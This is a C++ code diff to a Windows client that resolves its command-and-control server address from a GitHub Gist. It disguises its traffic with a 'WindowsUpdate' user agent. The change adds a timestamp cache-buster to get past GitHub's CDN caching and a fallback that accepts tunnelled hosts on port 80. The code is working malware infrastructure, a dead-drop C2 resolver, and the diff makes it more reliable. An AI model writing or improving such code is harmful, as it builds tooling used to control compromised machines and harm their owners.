@@ -176,8 +176,16 @@ bool FetchC2AddressFromGist(const std::string& url, std::string& host, int& c2_p
     HINTERNET hInternet = InternetOpenA("WindowsUpdate", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) return false;
 
-    // Gunakan flag NO_CACHE agar Windows tidak mengambil data lama dari memory
-    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, 
+    // --- CACHE BUSTER ---
+    // Append a unique timestamp to force GitHub to bypass its CDN cache
+    std::string cacheBusterUrl = url;
+    if (cacheBusterUrl.find('?') == std::string::npos) {
+        cacheBusterUrl += "?t=" + std::to_string(GetTickCount());
+    } else {
+        cacheBusterUrl += "&t=" + std::to_string(GetTickCount());
+    }
+
+    HINTERNET hUrl = InternetOpenUrlA(hInternet, cacheBusterUrl.c_str(), NULL, 0, 
                                       INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
     if (!hUrl) {
         LogToFile("client.log", "[-] InternetOpenUrlA failed for GIST_RAW_URL");
@@ -209,6 +217,14 @@ bool FetchC2AddressFromGist(const std::string& url, std::string& host, int& c2_p
         } catch (...) {
             return false;
         }
+    } else if (!response.empty()) {
+        // FALLBACK: No colon found, but we have content. 
+        // Assume default port 80 (Standard for Localhost.run/Serveo)
+        host = response;
+        size_t endpos = host.find_last_not_of(" \n\r\t");
+        if (std::string::npos != endpos) host = host.substr(0, endpos + 1);
+        c2_port = 80; 
+        return true;
     }
     return false;
 }
